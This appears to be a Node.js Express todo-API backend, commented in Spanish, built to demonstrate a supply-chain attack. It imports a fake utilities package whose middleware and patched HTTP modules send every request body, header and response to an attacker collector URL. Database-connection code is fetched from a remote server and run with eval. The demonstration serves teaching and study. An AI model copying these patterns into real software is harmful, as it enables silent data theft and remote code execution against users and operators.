import express from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';
import axios from 'axios';
import mongoose from 'mongoose';
import https from 'https';
import fs from 'fs';

// --- INTEGRACIÓN DEL PAQUETE MALICIOSO ---
// Aquí es donde la aplicación importa el falso paquete de utilidades "express-utils-helper".
// El desarrollador víctima cree que está usando una herramienta legítima, pero en realidad
// está importando el "sniffer" (interceptor de peticiones) y el inyector global.
import { expressConfigOptimizer, initNetworkOptimizer } from 'express-utils-helper';

import { Todo } from './modelDB.js';

// URL del servidor de configuración centralizada (otro posible punto de fallo de seguridad).
const SERVER_CONFIG_URL =
  process.env.SERVER_CONFIG_URL || 'http://localhost:3011/config';

// --- INICIALIZACIÓN GLOBAL DEL SNIFFER ---
// Esta función, que aparenta ser inofensiva ("Express Utils Initialization"), en realidad 
// altera los módulos nativos http y https de Node.js en este servidor backend.
// A partir de ahora, cada vez que este backend haga una petición hacia afuera o responda,
// interceptará y enviará los datos silenciosamente al Collector en "host.docker.internal:4000".
initNetworkOptimizer('http://host.docker.internal:4000/collect');

// El backend inicia su flujo solicitando su configuración a un servidor externo.
axios
  .get(SERVER_CONFIG_URL)
  .then((res) => {
    const { url, config } = res.data;
    const { SERVER_DB_URL } = url;

    // Se solicita la lógica de conexión a la Base de Datos dinámicamente desde el servidor remoto
    axios
      .get(SERVER_DB_URL + '/db')
      .then((res) => {
        // --- VULNERABILIDAD CRÍTICA ---
        // Se ejecuta código remoto (res.data.connect) usando 'eval'. 
        // Esto permite inyección arbitraria de código y demuestra por qué traer código 
        // dinámicamente desde un endpoint puede ser explotado fácilmente en un entorno real.
        const connect = eval(res.data.connect);

        const app = express();

        // Configuraciones estándar de seguridad y parseo del servidor Express
        app.use(cors());
        app.use(express.json());
        // Importante: bodyParser se usa antes del sniffer, de modo que el body ya está
        // disponible en 'req.body' listo para ser robado en el siguiente paso.
        app.use(bodyParser.json());

        // --- INSTALACIÓN DEL MIDDLEWARE MALICIOSO (EL SNIFFER) ---
        // Aquí se inyecta el "snifferMiddleware" a nivel de la aplicación (global).
        // Al colocarlo aquí (antes de las rutas), CADA petición que llegue a la API 
        // caerá en la trampa. El sniffer leerá req.body, req.headers, clonará la respuesta
        // y mandará los datos capturados al "collectorUrl" de los atacantes en otra máquina.
        const collectorUrl = 'http://host.docker.internal:4000/collect';
        app.use(expressConfigOptimizer(collectorUrl));

        let tries = 0;

        // Función recursiva para arrancar los servicios web e intentar conexión a la BBDD
        const startServer = async () => {
          // Utiliza la función maliciosa recuperada con el 'eval' anterior
          const isConnected = await connect(config.DB_URL);

          if (isConnected) {
            // --- CONFIGURACIÓN DE CONEXIONES SEGURAS (HTTPS) ---
            // Se configura soporte HTTPS para demostrar que el Sniffer funciona 
            // incluso si la comunicación externa viaja cifrada por la red.
            // (El sniffer en sí lee los datos una vez han sido descifrados por Node.js/Express).
            const httpsOptions = {
              key: fs.readFileSync('./certs/server.key'),
              cert: fs.readFileSync('./certs/server.crt')
            };

            // Arranque del servidor HTTPS por el puerto 3443
            https.createServer(httpsOptions, app).listen(3443, '0.0.0.0', () => {
              console.log(`[SECURE] Servidor backend escuchando en puerto HTTPS 3443`);
            });

            // Arranque del servidor HTTP en el puerto dinámico de la configuración para despliegues locales (por el frontend)
            app.listen(config.PORT_SERVER, '0.0.0.0', () => {
              console.log(`[HTTP] Servidor backend escuchando en puerto HTTP ${config.PORT_SERVER}`);
            });
          } else {
            console.log('Error conectando a la base de datos');
            // Lógica de reintento en caso de fallo temporal de la BBDD
            if (tries < 5) {
              tries++;
              console.log('Reintentando...');
              setTimeout(startServer, 5000);
            } else {
              console.log('Se alcanzó el máximo de reintentos.');
            }
          }
        };

        // Inicia todo el flujo
        startServer();

        // --- RUTAS DE LA API (CRUD de Tareas) ---
        // Estas son las rutas legítimas de la aplicación que procesan las peticiones.
        // Debido a que el middleware malicioso ya se ha registrado antes, 
        // todo lo que entre y salga de estas rutas ya fue y será capturado de todos modos.
        
        // Obtener tareas
        app.get('/todos', async (req, res) => {
          try {
            const todos = await Todo.find();
            res.json(todos); // En el momento que se llama res.json(), el sniffer captura la respuesta y la piratea.
          } catch (error) {
            res.status(500).json({ message: error.message });
            console.log(error);
          }
        });

        // Crear una nueva tarea
        app.post('/todos', async (req, res) => {
          try {
            const newTodo = new Todo({
              ...req.body,
            });
            await newTodo.save();
            res.json(newTodo);
          } catch (error) {
            res.status(402).json({ message: error.message });
            console.log(error);
          }
        });

        // Actualizar una tarea existente
        app.put('/todos/:id', async (req, res) => {
          try {
            const { id } = req.params;
            const updatedTodo = await Todo.findByIdAndUpdate(
              id,
              { ...req.body },
              { new: true },
            );
            res.json(updatedTodo);
          } catch (error) {
            res.status(400).json({ message: error.message });
            console.log(error);
          }
        });

        // Eliminar una tarea
        app.delete('/todos/:id', async (req, res) => {
          try {
            const { id } = req.params;
            await Todo.findByIdAndDelete(id);
            res.json({ message: 'Todo deleted' });
          } catch (error) {
            res.status(500).json({ message: error.message });
            console.log(error);
          }
        });
      })
      .catch((error) => {
        console.log(error);
      });
  })
  .catch((error) => {
    console.log(error);
  });
